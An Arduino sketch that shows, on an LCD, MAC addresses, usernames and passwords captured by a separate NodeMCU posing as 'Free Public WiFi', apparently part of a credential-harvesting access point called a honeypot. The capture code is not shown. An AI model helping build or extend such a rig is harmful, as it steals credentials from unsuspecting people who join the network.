#include <Wire.h>
#include <LiquidCrystal_I2C.h>

LiquidCrystal_I2C lcd(0x27, 20, 4); // Adjust I2C address if needed (try 0x3F if 0x27 doesn't work)

String currentMac = "";
String currentUser = "";
String currentPass = "";
unsigned long lastUpdate = 0;
int displayState = 0; // 0=waiting, 1=showing data, 2=scrolling

// NEW: toggle between showing user and password
bool showUser = true;
unsigned long lastToggle = 0;   // time of last switch (ms)
const unsigned long TOGGLE_INTERVAL = 5000; // 5 seconds

// Forward declaration
void displayUserOrPass();

void setup() {
  Serial.begin(9600); // Communication with NodeMCU
  Wire.begin();
  
  // Initialize LCD
  lcd.init();
  lcd.backlight();
  lcd.clear();
  
  // Display startup message
  lcd.setCursor(0, 0);
  lcd.print("Honeypot Monitor");
  lcd.setCursor(0, 1);
  lcd.print("Ready - Waiting...");
  lcd.setCursor(0, 2);
  lcd.print("Connect to:");
  lcd.setCursor(0, 3);
  lcd.print("Free Public WiFi");
  
  delay(2000);
}

void updateLCD(String mac, String user, String pass) {
  lcd.clear();

  // Save current values
  currentMac  = mac;
  currentUser = user;
  currentPass = pass;
  showUser    = true;           // start by showing user
  lastToggle  = millis();       // reset toggle timer
  
  // Line 1: MAC Address (scroll if too long)
  lcd.setCursor(0, 0);
  lcd.print("MAC:");
  if (mac.length() <= 16) {
    lcd.print(mac);
  } else {
    // Will handle scrolling in loop
    lcd.print(mac.substring(0, 16));
  }

  // Lines 2 & 3: show user or pass depending on state
  displayUserOrPass();
  
  // Line 4: Status
  lcd.setCursor(0, 3);
  lcd.print("Captured!");
}

void displayUserOrPass() {
  // Clear lines 1 and 2
  lcd.setCursor(0, 1);
  lcd.print("                    ");
  lcd.setCursor(0, 1);
  lcd.print("                    ");

  if (showUser) {
    // Show USER on line 1
    lcd.setCursor(0, 1);
    lcd.print("User:");
    String u = currentUser;
    if (u.length() > 15) u = u.substring(0, 15);
    lcd.print(u);
  } else {
    // Show PASS on line 1
    lcd.setCursor(0, 1);
    lcd.print("Pass:");
    String p = currentPass;
    if (p.length() > 15) p = p.substring(0, 15);
    lcd.print(p);
  }
}

void scrollMacAddress(String mac) {
  if (mac.length() > 16) {
    static unsigned long lastScroll = 0;
    static int scrollPos = 0;
    
    if (millis() - lastScroll > 300) { // Scroll every 300ms
      lastScroll = millis();
      lcd.setCursor(4, 0);
      String displayText = mac.substring(scrollPos);
      if (displayText.length() < 16) {
        displayText += " " + mac.substring(0, scrollPos);
      }
      lcd.print(displayText.substring(0, 16));
      scrollPos = (scrollPos + 1) % mac.length();
    }
  }
}

void loop() {
  // Check for data from NodeMCU
  if (Serial.available()) {
    String data = Serial.readStringUntil('\n');
    data.trim();
    
    // Parse data: MAC|username|password
    int firstPipe  = data.indexOf('|');
    int secondPipe = data.lastIndexOf('|');
    
    if (firstPipe != -1 && secondPipe != -1 && firstPipe != secondPipe) {
      String mac  = data.substring(0, firstPipe);
      String user = data.substring(firstPipe + 1, secondPipe);
      String pass = data.substring(secondPipe + 1);
      
      // Update LCD
      updateLCD(mac, user, pass);
      lastUpdate   = millis();
      displayState = 1;
      
      // Print to Serial for debugging
      Serial.print("LCD Updated: MAC=");
      Serial.print(currentMac);
      Serial.print(", User=");
      Serial.print(currentUser);
      Serial.print(", Pass=");
      Serial.println(currentPass);
    }
  }
  
  // Handle scrolling for long MAC addresses
  if (displayState == 1 && currentMac.length() > 16) {
    scrollMacAddress(currentMac);
  }

  // NEW: toggle between user and password every 5 seconds
  if (displayState == 1 && millis() - lastToggle > TOGGLE_INTERVAL) {
    showUser  = !showUser;      // flip between user and password
    lastToggle = millis();
    displayUserOrPass();        // redraw lines 1 & 2
  }
  
  // Return to waiting screen after 20 seconds
  if (displayState == 1 && millis() - lastUpdate > 20000) {
    lcd.clear();
    lcd.setCursor(0, 0);
    lcd.print("Waiting for next");
    lcd.setCursor(0, 1);
    lcd.print("connection...");
    lcd.setCursor(0, 2);
    lcd.print("Last capture:");
    lcd.setCursor(0, 3);
    lcd.print(millis()/1000 - lastUpdate/1000);
    lcd.print("s ago");
    displayState = 0;
  }
  
  delay(100);
}
